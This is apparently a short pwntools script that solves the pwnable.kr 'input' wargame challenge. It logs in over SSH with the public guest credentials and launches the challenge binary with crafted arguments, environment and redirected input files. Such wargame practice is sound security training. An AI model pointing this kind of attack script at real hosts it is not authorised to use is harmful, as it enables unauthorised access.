#!/usr/bin/python2
from pwn import *

USER_NAME = "input2"
PORT = 2222
SITE = "pwnable.kr"
PASSWORD = "guest"
SIZE = 100
FILE_PATH = "/home/input2/input"
STDIN = "/tmp/heroku/my_stdin"
STDERR = "/tmp/heroku/my_stderr"
TARGET_PORT = 8800

def fill_empty_args(arr,size):
    for i in range(size):
        arr.append(str(i)) 

def stage_one(args):
    args[ord('A')] = "\x00"
    args[ord('B')] = "\x20\x0a\x0d"
    return args

def get_payload(payload):
    payload = stage_one(payload) 
    return payload

def main():
    shell = ssh(USER_NAME,SITE,password=PASSWORD,port=PORT)

    argv = []
    my_env = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}

    fill_empty_args(argv,SIZE)

    argv[0] = FILE_PATH
    argv[65] = "\x00"
    argv[66] = "\x20\x0a\x0d"
    argv[ord("C")] = str(TARGET_PORT)
   
    argv = get_payload(argv)
    
    shell.set_working_directory("/tmp/heroku")
     
    p = shell.process(argv=argv,stdin=STDIN,stderr=STDERR,env=my_env)
 
    p.interactive() 
        

   
if __name__ == "__main__":
    main()
